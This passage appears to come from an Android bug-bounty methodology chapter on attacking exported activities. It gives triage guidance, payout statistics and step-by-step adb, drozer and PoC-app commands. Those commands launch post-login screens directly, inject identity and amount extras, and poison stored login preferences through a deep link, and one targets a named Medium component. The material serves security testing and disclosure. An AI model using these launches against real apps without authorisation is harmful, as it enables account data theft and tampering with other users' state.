# D04 · Exported Activities, Task & UI-Redress Attacks

> Every exported activity is a public method that any installed app may call with fully attacker-chosen
> arguments, and every task/overlay attribute decides whether the user can tell whose screen they are
> looking at. The severity ceiling is **P1 authentication bypass** — but only through the activities that
> render or mutate account state; the task-hijack and tapjacking halves of this domain are pinned to P5
> and are worth writing up only as chain legs or as defensible negatives.

| | |
|---|---|
| **Phases** | P3 inventory (the register), P5 IPC & component attack (the proof), P7 chaining (the conversion) |
| **Milestones** | M3, M5, M7 |
| **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (P1) — reached when an exported activity renders or mutates account state and the **backend honours it**. Failing that, `broken_access_control.exposed_sensitive_android_intent` (null = rated on what it exposes). |
| **Primary attacker model** | AM-03 zero-permission local app. AM-02 where a `BROWSABLE` filter also reaches the same activity; AM-04 for every overlay item (`SYSTEM_ALERT_WINDOW` is user-granted); AM-10/AM-11 for the lock-screen and Recents items. |
| **Maps to** | MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-AUTH-1; MASTG-TEST-0364, MASTG-TEST-0340, MASTG-TEST-0289, MASTG-TEST-0291, MASTG-TECH-0160, MASTG-TECH-0164, MASTG-TOOL-0015; MASWE-0018, MASWE-0023, MASWE-0036, MASWE-0038, MASWE-0039, MASWE-0040; CWE-306, CWE-862, CWE-863, CWE-926, CWE-927, CWE-1021; ATT&CK T1417.002, T1516, T1626, T1628.001, T1655.001 |

## Why this domain pays

It pays through exactly one door. An exported activity that renders the logged-in user's address book, or
that takes `userId` from an extra and asks the backend for that user's record, converts straight out of the
P5 mobile branch into `broken_authentication_and_session_management.authentication_bypass` (P1) or
`broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1). The MASTG's
own worked example — `am start -n com.mwr.example.sieve/.PWList` walking past a password manager's login
form — is thirteen years old and still the single highest-frequency shape in the disclosed corpus. Google's
own rule is the calibration: "It is not a vulnerability if an app exports an activity … **unless it can be
used to gain unauthorized access to application data or functionality**." The export is never the finding.
The data behind it is.

Everything else in this chapter is graveyard-adjacent and you should know that before you spend a day on it.
Bugcrowd prices `mobile_security_misconfiguration.tapjacking` at **P5** and
`insecure_data_storage.screen_caching_enabled` at **P5**. Google's Mobile VRP names "Variants of Strandhogg
and Tapjacking" in its non-qualifying list outright, and its Invalid Reports page excludes
"Tapjacking/overlay SYSTEM_ALERT_WINDOW vulnerability on a non-security-critical screen" with only three
carve-outs: overlays that interfere with a **permission** approval, with **app-installation** approval, or
that **hide a privacy-sensor indicator**. Task hijacking is heavily represented in every public Android
checklist and almost never converts. YesWeHack's Gojek program excludes anything "only possible on Android
version 8 and below", which is where StrandHogg lives. Treat both as ruled-out work unless you can produce
a *named irreversible action completing* or a *credential you captured*.

The honest base rate from the disclosed set: exported-activity-to-WebView is the highest-yield single shape
(H1 #499348 Twitter Lite rated **Critical**; #283058 IRCCloud, #2555949 US DoD and #694053 Lark all Medium;
#532836 Exness Low at $400 — the differentiator at triage is whether you demonstrated *data egress* rather
than `alert(1)`). App-lock and in-app-PIN bypasses cluster at **Low**: Shopify #637194 Low $500, Nextcloud
#1825679 Low 1.8, #1784645 Low 2.5, Whisper #50884 $100, with several Nextcloud passcode bypasses paying
$0. Crash-only intent fuzzing pays nothing anywhere: Bugcrowd P5, Xiaomi out-of-scope, Reddit out-of-scope,
TikTok "must achieve arbitrary code execution, not just trigger an application crash".

## The crux question

**Is there any screen in this app whose security depends on the user having arrived from the previous
screen — and can I start it directly, from a package that holds no permissions, with the arguments of my
choice?**

## Triage order

1. **Build the register and fire it.** Every other item in this chapter consumes the exported-activity list. An hour here decides the week.
2. **Post-auth reach.** Launch the screens that sit behind login, onboarding, KYC or the app lock. This is where the only P1 in the domain lives, and it is a two-minute test per activity.
3. **Extras that name an identity or an amount.** `userId`, `account_id`, `orderId`, `amount`, `isAdmin`. A rendered value is nothing; the backend honouring it is a P1 IDOR.
4. **URL/HTML extras reaching a WebView.** Highest-yield single sink in the disclosed corpus; hand the origin confusion to D10 immediately.
5. **The result channel.** `setResult` leaks and the full-intent echo — one grep, and the echo reaches non-exported providers.
6. **`onNewIntent` re-delivery.** State established in `onCreate`, re-driven from a second caller. Cheap, and it re-opens every activity you thought was single-entry.
7. **Non-exported reach.** Aliases, system deputies, `intentMatchingFlags` holes. These re-open the components you already ruled out.
8. **Lock-screen and cross-user attributes.** `showWhenLocked`, `showForAllUsers`, `directBootAware` — four greps, and a hit is a genuine boundary crossing.
9. **Task hijacking.** Only after you have read `minSdkVersion`. Below that gate it is a demo; above it, a manifest-hygiene note.
10. **UI redress.** Only with a demonstrated *trigger* and a *named irreversible action*. Overlay-without-timing recordings do not survive triage.
11. **Recents and `FLAG_SECURE`.** Almost always a ruled-out entry. Write the negative with the black `screencap` as evidence.
12. **Framework- and library-contributed activities.** The register contains components your client's developers never wrote — an engine player activity, a cropper, a dev menu. Read them by class name, not by package prefix.
13. **Crash fuzzing.** Run it because it is nearly free, but treat every crash as a triage-ordering signal, not a finding.

## Items

### D04-001 · Build the exported-activity register from the installed package, not the source manifest

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0160, MASTG-TOOL-0004, MASTG-TOOL-0015; `risks/android-exported` |

- **Test:** Enumerate every `<activity>` and `<activity-alias>` with its `exported`, `permission`,
  `taskAffinity`, `launchMode`, `documentLaunchMode`, `intentMatchingFlags` and intent-filter count. Do it
  from the *installed* package as well as the decoded APK: components registered by a library at merge time,
  and aliases, appear in `dumpsys` even when you missed them in the manifest.
- **How:**
  ```bash
  apktool d base.apk -o out/ >/dev/null
  xmlstarlet sel -t -m "//activity | //activity-alias" \
    -v "name()" -o " name=" -v "@android:name" \
    -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" \
    -o " affinity=" -v "@android:taskAffinity" -o " launchMode=" -v "@android:launchMode" \
    -o " docLaunch=" -v "@android:documentLaunchMode" -o " imf=" -v "@android:intentMatchingFlags" \
    -o " filters=" -v "count(intent-filter)" -n out/AndroidManifest.xml | tee exported_register.txt
  # raw view — exported=true renders as 0xffffffff in the binary manifest
  aapt2 d xmltree base.apk --file AndroidManifest.xml | grep -A25 -E "E: activity|E: activity-alias"
  # the installed truth, including library-contributed components
  adb shell dumpsys package com.target.app | sed -n '/Activity Resolver Table/,/Receiver Resolver Table/p'
  ```
- **Proof:** A register file with one row per activity and alias, in which every row has a non-empty
  `exported` column resolved (see D04-002) and a `perm` column. The artefact is the attack-surface appendix
  of the report.
- **Escalation:** The `perm=` empty rows are the input to D04-004 and every item after it. Rows whose name
  contains `debug|dev|internal|qa|staging|flag|config` go to D04-013 first. Rows with a `<data>` filter also
  belong to -> D09 deep links.
- **Ruled out when:** Every activity and alias in the register carries `android:exported="false"`, or carries
  a `android:permission` whose `<permission>` element declares `protectionLevel="signature"` and the
  declaring package is the app itself (check for the dangling-permission case in D03 before accepting this).
  A register in which `exported` is empty on any row is not a negative — it is an unresolved default.

### D04-002 · Resolve the real export default per component type and targetSdk before calling anything "not exported"

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; the implicit-export default is **LEGACY** and applies only at targetSdk < 31 |
| **Maps to** | `risks/android-exported`; `about/versions/12/behavior-changes-12#exported`; MobSF `exported_intent_filter_exists` / `explicitly_exported`; mindedsecurity `MSTG-PLATFORM-4_3` |

- **Test:** For `<activity>`, `<activity-alias>`, `<service>` and `<receiver>` the default is `"false"` with
  no intent filter and **`"true"` with at least one intent filter**. Apps targeting API 31+ cannot build
  without an explicit `android:exported` on a filtered component, so on a modern target the attribute is
  always present and you read it; below 31 you must compute it.
- **How:**
  ```bash
  aapt dump badging base.apk | grep -oE "(target|min)SdkVersion:'[0-9]+'"
  python3 - <<'PY'
  import re
  x = open('out/AndroidManifest.xml').read()
  pat = r'<(activity|activity-alias|service|receiver|provider)\b[^>]*>.*?</\1>|<(activity|activity-alias|service|receiver|provider)\b[^>]*/>'
  for m in re.finditer(pat, x, re.S):
      b = m.group(0); head = b.split('>')[0]
      if '<intent-filter' in b and 'android:exported' not in head:
          print('IMPLICIT-EXPORT', head)
  PY
  ```
  Then prove it empirically rather than trusting the computation:
  ```bash
  adb shell am start -n com.target.app/.TheActivity
  ```
- **Proof:** The absence of `java.lang.SecurityException: Permission Denial: ... not exported from uid ...`
  on the launch is the proof of export. `am start` result codes: `3` = delivered; `-92 / Access blocked` =
  rejected by `enforceIntentFilter`; `102` = `BAL_BLOCK`.
- **Escalation:** Each implicitly-exported component is a component the developer did not intend to export —
  say so in the report, because "we never meant to export it" is the real root cause on sub-31 builds, and
  the opposite framing applies at 31+: the export was a deliberate decision.
- **Ruled out when:** `targetSdkVersion >= 31` **and** every filtered activity/alias carries an explicit
  `android:exported="false"`, verified by a `Permission Denial` on a direct `am start`. Never rule this out
  from the attribute alone on a sub-31 target.

### D04-003 · `<activity-alias>` re-exporting an activity that is itself `exported="false"`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the aliased screen is post-auth |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0160 ("activity aliases have their own `android:exported`, `android:permission`, and intent filters, so review them separately"); MASTG-KNOW-0132; `guide/topics/manifest/activity-alias-element`; hackwithsingh sec-14-16 #41, sec-14-19 #46 |

- **Test:** "With the exception of `targetActivity`, `<activity-alias>` attributes are a subset of
  `<activity>` attributes. For attributes in the subset, **none of the values set for the target carry over
  to the alias**", and the alias's `android:permission` "supplants any permission set for the target
  activity itself." So an exported, permission-free alias re-exports a locked-down activity, and a tester
  who enumerated only `<activity>` will have ruled out the wrong element.
- **How:**
  ```bash
  xmlstarlet sel -t -m "//activity-alias" -v "@android:name" -o " -> " -v "@android:targetActivity" \
    -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" -n out/AndroidManifest.xml
  xmllint --format out/AndroidManifest.xml | grep -n -A10 '<activity-alias'
  # launch the ALIAS class name, never the target
  adb shell am start -n com.target.app/.PublicAlias
  adb shell am start -n com.target.app/.internal.RealActivity   # expect Permission Denial
  ```
- **Proof:** The target activity's UI appears after launching the *alias* class name, while a direct launch
  of `targetActivity` returns `java.lang.SecurityException: Permission Denial: ... not exported from uid`.
  That delta — alias succeeds, target denied — is the whole finding.
- **Escalation:** Whatever the target activity does is now unauthenticated; re-run D04-007, D04-010 and
  D04-015 against the *alias* name. If the alias is the launcher entry, also check D04-064.
- **Ruled out when:** The manifest declares no `<activity-alias>`, or every alias carries
  `android:exported="false"`, or every alias's `android:permission` resolves to a `signature` permission
  declared by this package. An alias whose `targetActivity` is exported anyway is not this finding — it is
  D04-007 against the target.

### D04-004 · Fire every exported activity from an unprivileged UID and read `topResumedActivity`, not the exit code

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0160; MASTG-TOOL-0015 (drozer `app.activity.info` / `app.activity.start`); objection `android intent launch_activity`, `android hooking get current_activity` |

- **Test:** Manifest reachability is a claim. Launching from the `shell` UID, which holds no app permissions,
  is the first proof. The oracle that matters is whether the activity **stayed resumed** under attacker
  extras (it validated nothing) or `finish()`ed immediately (it validated something).
- **How:** Warm-start only — an `am force-stop` before each launch routes the cold start through the launcher
  activity and invalidates every row.
  ```bash
  #!/bin/bash  # asweep.sh <pkg>  — count your results; do not trust a silent loop
  PKG=$1
  adb shell monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null; sleep 6
  adb logcat -c -b crash
  N=0
  for A in $(adb shell dumpsys package "$PKG" | grep -oE "$PKG/[A-Za-z0-9_.\$/]*" | sort -u); do
    for X in "" "--es model x" "--ei model 1" "--es url http://x/" "--esn nullextra"; do
      adb shell am start -n "$A" $X >/dev/null 2>&1; sleep 2
      T=$(adb shell dumpsys activity activities | grep -m1 topResumedActivity | sed 's/.*u0 //;s/ .*//')
      printf '%-70s %-18s -> %s\n' "$A" "${X:-<bare>}" "$T"; N=$((N+1))
      adb shell input keyevent KEYCODE_BACK >/dev/null 2>&1; sleep 1
    done
  done
  echo "rows=$N"; echo "== crashes =="; adb logcat -d -b crash | grep -E 'FATAL|AndroidRuntime' | head
  ```
  drozer equivalent, with the flags verified in `src/drozer/android.py`:
  ```
  dz> run app.activity.info -a com.target.app -i -v
  dz> run app.activity.info -p null                 # activities with NO permission requirement
  dz> run app.activity.start --component com.target.app com.target.app.ui.AccountActivity --flags 0x0
  ```
  Note drozer's own documented behaviour: *"If no flags are specified, drozer will add the ACTIVITY_NEW_TASK
  flag."* Pass `--flags 0x0` when you need a same-task launch.
- **Proof:** The `topResumedActivity` column. A component that is still resumed under attacker-supplied
  extras is a candidate; a component absent from the column finished itself. `rows=N` must equal
  `activities × extra-sets` — a shell loop that silently produced fewer rows than that has failed, and the
  "clean sweep" is an artefact of the loop, not of the app.
- **Escalation:** Every resumed row goes to D04-007 (does it render data?), D04-010 (does it take an
  identity?) and -> D08 (does it forward `getIntent()`?).
- **Ruled out when:** Every exported activity either finishes immediately or renders a screen that requires
  and performs a fresh credential check, verified by reading the decompiled `onCreate` for the session gate —
  not by the sweep's silence. A sweep whose row count does not match the register is not a negative.

### D04-005 · Re-prove every candidate from a zero-permission attacker APK — an adb-only proof does not establish AM-03

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | sec-88 "Exported Activity Hacking"; Google Mobile VRP "user must install malicious app" column; MASTG-TEST-0364 |

- **Test:** `adb shell am start` runs as `shell` (uid 2000), which holds `android.permission.*` grants no
  third-party app has, and on some builds can start components that are not exported at all. A finding whose
  only evidence is an adb command will be disputed, and correctly so.
- **How:** A stub app with a completely empty `<uses-permission>` set:
  ```java
  // MainActivity.onCreate of com.poc.zeroperm — manifest declares NO permissions
  Intent i = new Intent();
  i.setClassName("com.target.app", "com.target.app.ui.AccountActivity");
  i.putExtra("userId", 1337);
  startActivity(i);
  // for the result channel:
  startActivityForResult(i, 1);
  // onActivityResult: Log.i("poc", String.valueOf(data == null ? null : data.getExtras()));
  ```
  ```bash
  adb install -r zeroperm.apk
  adb shell dumpsys package com.poc.zeroperm | sed -n '/requested permissions/,/install permissions/p'
  adb shell am start -n com.poc.zeroperm/.MainActivity
  adb logcat -s poc:I
  ```
- **Proof:** The `dumpsys package` block showing an empty requested-permission list for the PoC, the PoC's
  own logcat tag carrying the stolen data or the target activity resumed, and the PoC's `AndroidManifest.xml`
  included in the evidence tree.
- **Escalation:** This is the gate that turns every candidate in this chapter into an AM-03 finding rather
  than an AM-12 observation. Keep the rooted device for discovery only.
- **Ruled out when:** The activity starts from `adb shell` but a zero-permission PoC receives
  `SecurityException: Permission Denial` — which means the component is not actually exported and the adb
  result was shell privilege. Record the exception text; that is a defensible negative.

### D04-006 · `android:intentMatchingFlags` absent, or a per-component `none` hole punched in the app's own hardening

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk >= 36 for the control; the underlying gap exists on every version |
| **Maps to** | `about/versions/16/behavior-changes-16` ("Safer Intents", `intentMatchingFlags` values `none` / `enforceIntentFilter` / `allowNullAction`); `guide/topics/manifest/{application,activity,activity-alias,receiver,service,provider}-element` |

- **Test:** Android 16 adds `android:intentMatchingFlags`, settable on `<application>`, `<activity>`,
  `<activity-alias>`, `<receiver>`, `<service>` and `<provider>`, the component value overriding the
  application value. `enforceIntentFilter` makes a cross-app **explicit** intent match the target's declared
  filter and rejects action-less intents — closing the classic "an explicit intent to an exported component
  bypasses its filters" gap. Two findings live here: the attribute absent altogether on a component that
  trusts intent data, and — the stronger one — an app that sets `enforceIntentFilter` globally and then sets
  `intentMatchingFlags="none"` on one exported component.
- **How:**
  ```bash
  grep -nE 'android:intentMatchingFlags' out/AndroidManifest.xml
  # on-device: send a deliberately mismatched EXPLICIT VIEW intent
  adb shell am start -n com.target.app/.MainActivity -a android.intent.action.VIEW -d 'https://evil.example/'
  adb logcat | grep -E "Intent does not match component's intent filter:|Access blocked:"
  ```
  The documented logcat filter is `tag=:PackageManager & (message:"Intent does not match component's intent
  filter:" | message: "Access blocked:")`.
- **Proof:** `result code=-92 / Access blocked` when the flag is in force, versus `result code=3 / delivered`
  when it is not — and, for the hole variant, a component carrying `intentMatchingFlags="none"` that produces
  no `Access blocked:` line while its siblings do.
- **Escalation:** Absence is what lets a **local** app deliver an arbitrary URI (any host, `javascript:`,
  `data:`) to an exported Flutter/React Native `MainActivity` router that a browser could only reach through
  the `autoVerify`'d hosts -> D09 -> D10. Absence plus an activity that forwards `getIntent()` data is
  -> D08.
- **Ruled out when:** `<application android:intentMatchingFlags="enforceIntentFilter">` is set with no
  component-level `none` override, **and** the mismatched explicit intent above returns `-92 / Access
  blocked`. On a target below API 36 this control cannot exist, so the correct negative is "not applicable at
  targetSdk N", not "hardened".

### D04-007 · Post-authentication activity renders account data with no session check

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the backend honours it; `broken_access_control.exposed_sensitive_android_intent` (null) when it renders cached local data only |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0364, MASTG-TEST-0029 (deprecated v1 predecessor, retains the Sieve walkthrough); MASWE-0018 (CWE-306, 862, 863, 926); MASVS-AUTH-1; Mobile Top 10 2024 M3 Scenario 2 ("backend assumes hidden UI elements prevent unauthorized access"); H1 #55064, #145402, #951691; sec-88 checklist §8 |

- **Test:** The canonical shape. Identify the activities that render authenticated content — account list,
  balance, order history, vault, message thread — and start each one directly, cold, from a package that has
  never logged in. MASTG's own example is `am start -n com.mwr.example.sieve/.PWList`, which walks past a
  password manager's login form and renders the vault.
- **How:**
  ```bash
  # 1. log in normally and learn the post-auth component names
  adb shell dumpsys activity activities | grep -E 'topResumedActivity|mResumedActivity'
  # 2. kill the process so no in-memory session explains the result, then launch cold
  adb shell am force-stop com.target.app
  adb shell am start -n com.target.app/.ui.AccountActivity
  adb exec-out screencap -p > shot_account.png
  # 3. and from the zero-permission PoC (D04-005), never adb alone
  ```
  Read the gate in jadx before you rate it:
  ```bash
  grep -rnE 'class .*(Base|Secure|Locked)Activity|onCreate\(.*\{' out/sources/ | head
  grep -rnE 'isLoggedIn|hasSession|requireAuth|getAccessToken\(\)\s*==\s*null|startLoginActivity' out/sources/
  ```
- **Proof:** A screenshot of the victim's real data on a device where the login flow was never completed in
  this process lifetime, **plus** the network request that screen issued returning `200` with real data in
  the proxy log. The screen rendering from cache is a different, lesser finding — say which one you have.
- **Escalation:** This is the canonical proof that authorisation is client-side. Immediately re-test the same
  operation directly against the API -> D15; the same flaw is usually there and is worth more. If the screen
  takes an identifier, go to D04-010.
- **Ruled out when:** `onCreate` (or the base activity's `onResume`) reads a session token and calls
  `finish()` plus a redirect to the login activity before any data load, **and** the launch from a logged-out
  state lands on the login screen with `topResumedActivity` naming the login component. A blank or skeleton
  screen with no data is also a true negative for this item — record it as "local gate bypassed, no data
  rendered" rather than dropping it.

### D04-008 · In-app lock / PIN / biometric gate bypassed by starting an inner activity

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) only if it crosses a *user* boundary rather than the local gate |
| **Attacker** | AM-03 where the inner activity is exported; AM-11 otherwise |
| **Applies to** | every app shipping an "app lock", "require biometrics to open" or PIN-on-resume setting |
| **Maps to** | H1 #637194 (Shopify, Low $500), #1825679 (Nextcloud, Low 1.8), #1784645 (Nextcloud, Low 2.5), #50884 (Whisper, $100), #2245437 / #1847368 / #631206 (Nextcloud passcode bypasses); Google Mobile VRP non-qualifying "Secondary lockscreen bypasses"; Xiaomi rates "Bypass APP lock screen" MEDIUM |

- **Test:** An app lock is almost always one check in a base `Activity.onResume()`. Any re-entry path that
  lands *below* that base class — an exported inner activity, a deep link, a notification `PendingIntent`, a
  pinned shortcut, a widget tap — skips it.
- **How:**
  ```bash
  grep -rniE 'AppLockActivity|PinActivity|LockScreenActivity|BiometricPrompt|isAppLocked|requireUnlock|showPinScreen' out/sources/
  adb shell dumpsys package com.target.app | grep -oE "com\.target\.app/[A-Za-z0-9_.\$]+" | sort -u > acts.txt
  # arm the lock (background the app past its timeout), then walk every activity
  while read A; do
    adb shell am start -n "$A" >/dev/null 2>&1; sleep 1
    echo -n "$A -> "; adb shell dumpsys activity activities | grep -m1 topResumedActivity
  done < acts.txt
  adb shell cmd shortcut get-shortcuts com.target.app     # and tap each one while locked
  ```
- **Proof:** `topResumedActivity` naming an account-bearing screen while the PIN screen was owed, with a
  screenshot of the data and no unlock prompt. State the trigger precisely: Shopify #637194's accepted
  wording was "the application must be **open** when triggered", and stating that precondition plainly did
  not reduce the payout while preventing a not-reproducible close.
- **Escalation:** Say which reachability you have. A zero-permission app reaching the inner activity is worth
  far more than an `adb` reproduction, which is AM-11 at best. Combine with D11 (data still on disk) and D13
  (session token still valid) for the complete unlocked-device narrative. If the same path reaches *another
  user's* data, refile as theft of sensitive data — that is the payable framing.
- **Ruled out when:** The lock state is enforced in a base class that every activity extends **and** the
  check runs in `onResume` before `setContentView`/data load, verified by launching each activity in the
  register and observing the PIN screen resume each time. Also a true negative when the vendor documents the
  lock as a convenience feature rather than a security control — record that in the register entry.

### D04-009 · Do not claim an auth bypass from a rendered screen — prove the layer you actually passed

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | governs `broken_authentication_and_session_management.authentication_bypass` (P1) claims |
| **Attacker** | n/a — kill gate |
| **Applies to** | every auth-bypass claim originating in this chapter |
| **Maps to** | claude-bughunter `triage-validation` "THE LAYER-ORDERING TRAP"; MASWE-0018 |

- **Test:** An exported activity that renders is evidence that the *client* gate was skipped, nothing more.
  When you then hit the API the screen calls, the same trap applies in reverse: many stacks run a body parser
  or input sanitiser **in front of** the auth middleware, so a malformed request is rejected before auth is
  ever consulted and the 400 looks exactly like "auth passed, validation failed". Re-test with a minimal
  well-formed body before claiming the endpoint is unauthenticated.
- **How:**
  ```bash
  # malformed — tells you nothing about auth
  curl -s -X POST https://api.target.com/v1/account -d '{'
  # 400 {"code":"ERR-INPUT-0001","message":"Invalid text. Only permitted characters are allowed"}

  # minimal well-formed — this is the one that locates the auth layer
  curl -s -X POST https://api.target.com/v1/account -H 'Content-Type: application/json' -d '{}'
  # 401 {"code":"ERR-AUTH-0001","message":"Not authenticated. Please log in."}
  ```
  Then apply the same to the client-side half: where the activity renders a post-MFA screen, check that the
  **subsequent** API calls from that screen also succeed. A client-side-only MFA skip is only a real finding
  if the calls behind it work.
- **Proof:** Two responses side by side. If the error text is about input *shape* or *character class* you
  are talking to a parser, not to business logic. If it names a domain field and a well-formed `{}` still
  returns it, that is real signal. Keep a `diff` of the two response bodies: a byte-identical 200 is not a
  bypass, whatever the status code did.
- **Escalation:** Passing this gate is what promotes D04-007 from `exposed_sensitive_android_intent` (null)
  to `authentication_bypass` (P1). Failing it saves you a retraction against production financial
  infrastructure.
- **Ruled out when:** The well-formed minimal request returns `401`/`403` — the activity bypassed a client
  gate only. File it as a local gate bypass at Medium and stop escalating.

### D04-010 · Attacker-chosen extras name an identity, a role or an amount that the backend honours

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for read+write on iterable ids; `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) read-only; `broken_access_control.idor.modify_view_sensitive_information_guid` (P4) for GUIDs |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0364; ATT&CK T1626 (detection DET0642 correlates "rapid transition to elevated capability state without expected user interaction patterns"); EDB 49563 (Tasks 9.7.3, `ShareLinkActivity` / `VoiceCommandActivity`); sec-88 "Android App Components Security Cheatsheet"; Het Mehta Phase 3 |

- **Test:** Find the extras each exported activity reads, then supply values that name somebody else's
  object, a privileged role, or a money amount. The activity *displaying* your value is not the finding; the
  server acting on it is.
- **How:**
  ```bash
  grep -rnE 'getIntent\(\)\.(getStringExtra|getIntExtra|getLongExtra|getBooleanExtra|getExtras|getData|getParcelableExtra)' out/sources/
  ```
  Then drive every typed branch. `--es` string, `--ez` boolean, `--ei` int, `--el` long, `--ef` float,
  `--esa` string array, `--esn` null string, `--eu` URI:
  ```bash
  adb shell am start -n com.target.app/.TransferActivity \
    --es amount 1 --es toAccount ATTACKER --ez skipPin true --ei userId 1337
  adb shell am start -n com.target.app/.OrderActivity --el orderId 100001
  adb shell am start -n com.target.app/.X --eu uri 'content://com.target.app.provider/private'
  ```
  drozer's verified extra grammar covers the types `am` cannot reach —
  `boolean, byte, char, double, float, integer, long, parcelable, short, string, bytearray` plus a `bundle`
  type taking `;`-separated `<prefix>.<key>=<value>` pairs (`S.`=String, `B.`=Boolean, `b.`=Byte, `c.`=Char),
  and `bytearray` accepts `base64(<b64>)` or `hex(<hex>)`:
  ```
  dz> run app.activity.start --component com.target.app com.target.app.PayActivity \
        --extra string account_id 99999 --extra integer amount 1 --extra boolean is_verified true
  dz> run app.activity.start --component com.target.app com.target.app.ImportActivity \
        --extra bytearray blob 'hex(aced0005...)'
  ```
- **Proof:** The outbound request in the proxy carrying your injected value **and** a `200` with the other
  account's data or the state change applied. Use an 8+ character random marker for any value you claim was
  reflected (`x4hd2k9pq`, never `test`/`AAAA`/`attacker`) and search the baseline response for the marker
  first — that single check kills most false reflection reports.
- **Escalation:** Read *and* write are separately rated: read-only is P3, read+write on iterable identifiers
  is P1. A `parcelable`/`bundle`/`bytearray` extra goes to -> D08 (nested-intent redirection) and -> D17
  (deserialisation). A URL extra goes to D04-015.
- **Ruled out when:** The activity reads the extra only to select a UI string or an analytics label, and
  every data load is keyed on the session-derived identifier rather than the extra — verified by tracing the
  extra to its sink in jadx and by the proxy showing the request carrying the *session's* id and not yours.
  Also a true negative when the server returns `403` for the substituted id: that is a server-side
  authorisation check doing its job, and it belongs in the ruled-out register with the request/response pair.

### D04-011 · Exported activity writes attacker data straight into persistent identity state

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the permanent-DoS half is `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) |
| **Attacker** | AM-03; AM-02 where the same activity carries a `BROWSABLE` filter |
| **Applies to** | all |
| **Maps to** | ghandar0x, `com.target.ui.AuthAnswerActivity` (scheme `target`, host `app`) — "Interface Spoofing" plus a permanent DoS |

- **Test:** Some exported activities do not navigate, they **persist**. The pattern is
  `getIntent().getData()` -> `getQueryParameter`/JSON -> `SharedPreferences.Editor.putString(...).apply()`.
  Feeding it attacker data overwrites the user's identity, workspace or token record, and the app cannot
  recover.
- **How:**
  ```bash
  grep -rnE 'getSharedPreferences\(|\.edit\(\)|putString\(|putBoolean\(' out/sources/ -B12 \
    | grep -nE 'getIntent\(\)|getQueryParameter|getData\(\)'
  adb shell am start -a android.intent.action.VIEW \
    -d 'target://app?status=%7B%22user%22%3A%22HACKER_MAN%22%2C%22ws%22%3A%22evil.via.targetnetworks%22%7D'
  adb shell run-as com.target.app cat shared_prefs/LOGIN_PREFS.xml
  ```
- **Proof:** `LOGIN_PREFS.xml` now containing your `user`/`ws`/token values, and the app rendering the
  attacker's username on the next cold launch. For the DoS half, show the app still broken after
  `am force-stop` and after `adb reboot`.
- **Escalation:** Persistent state poisoning gives a phishing surface *inside* a trusted app shell, or forces
  re-authentication against an attacker-chosen workspace -> D13. If the poisoned value is read at launch and
  crashes the app, that is the payable DoS shape in D04-062.
- **Ruled out when:** Every write reachable from an intent-derived value is namespaced to a
  non-security-relevant preference file and is re-validated against the server on next launch — verified by
  poisoning the value and observing the app overwrite it with the server's copy. `run-as` failing because the
  build is not debuggable is not a negative; pull the file on the rooted analysis device instead.

### D04-012 · Exported activity commits a server-side state change for the logged-in user

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; especially `SEND`, `PROCESS_TEXT`, `VIEW` share-target activities |
| **Maps to** | Raju Kumar, Medium Android `SaveToMediumActivity` (reported 2020-09-29, fixed and bountied 2020-10-02); EDB 49563; VRT remediation note for this path points at Mobile Top 10 2016-M1 Improper Platform Usage |

- **Test:** A "boring" share target is still a finding when it mutates server-side user state on behalf of an
  unauthenticated local caller. The integrity break is the finding, not the confidentiality one.
- **How:**
  ```bash
  adb shell am start -n com.medium.reader/com.medium.android.donkey.save.SaveToMediumActivity \
    -e android.intent.extra.TEXT "https://attacker.example/"
  adb shell am start -n com.target.app/com.target.app.ShareLinkActivity \
    -a android.intent.action.PROCESS_TEXT \
    --es android.intent.extra.PROCESS_TEXT "x4hd2k9pq-marker"
  ```
- **Proof:** The attacker-supplied item appearing in the victim's server-side list, **visible on the web
  app** — the out-of-band confirmation is what stops this being dismissed as local UI state.
- **Escalation:** Combine with a stored-content sink in the web application for cross-surface impact; and
  check whether the same activity accepts an identity extra (D04-010), which moves it from integrity-only to
  P1.
- **Ruled out when:** The share target requires a user tap on a confirmation control that the caller cannot
